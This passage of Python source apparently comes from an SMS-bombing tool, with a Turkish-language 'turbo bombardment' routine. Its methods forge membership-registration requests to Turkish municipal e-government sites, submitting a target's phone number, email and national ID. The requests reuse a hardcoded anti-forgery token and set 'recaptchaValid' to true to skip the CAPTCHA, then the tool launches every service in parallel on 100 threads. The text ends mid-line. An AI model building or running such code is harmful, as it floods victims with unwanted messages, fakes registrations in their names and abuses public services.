        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMEMATİ\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBAS\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.EPosta\"\r\n\r\n{self.mail}\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\nMemati31\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.SifreyiDogrula\"\r\n\r\nMemati31\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"recaptchaValid\"\r\n\r\ntrue\r\n"
        body += f"--{boundary}--\r\n"
        r = self._post("https://e-belediye.sancaktepe.bel.tr/Sicil/KisiUyelikKaydet",
            data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        if r and r.status_code == 200:
            with self.lock: self.adet += 1
            return True
        return False

    def Bayrampasa(self):
        boundary = '----WebKitFormBoundary' + ''.join(choice(ascii_lowercase) for _ in range(16))
        body = f"--{boundary}\r\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\r\n\r\nzOIiDXRlsw-KfS3JGnn-Vxdl5UP-ZNzjaA207_Az-5FfpsusGnNUxonzDkvoZ55Cszn3beOwk80WczRsSfazSZVxqMU0mMkO70gOe8BlbSg1\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n07.06.2000\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMEMATİ\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBAS\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.EPosta\"\r\n\r\n{self.mail}\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\nMemati31\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.SifreyiDogrula\"\r\n\r\nMemati31\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"recaptchaValid\"\r\n\r\ntrue\r\n"
        body += f"--{boundary}--\r\n"
        r = self._post("https://ebelediye.bayrampasa.bel.tr/Sicil/KisiUyelikKaydet",
            data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        if r and r.status_code == 200:
            with self.lock: self.adet += 1
            return True
        return False


# Servis fonksiyonlarını otomatik topla
servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value) and not attribute.startswith('__') and attribute != '_post':
        servisler_sms.append(attribute)

MAX_THREADS = 100  # Aynı anda çalışacak maksimum thread sayısı

def turbo_bombardiman(tel_no, mail):
    """Tüm servislere aynı anda paralel istek at"""
    send_sms = SendSms(tel_no, mail)
    
    with ThreadPoolExecutor(max_workers=MAX
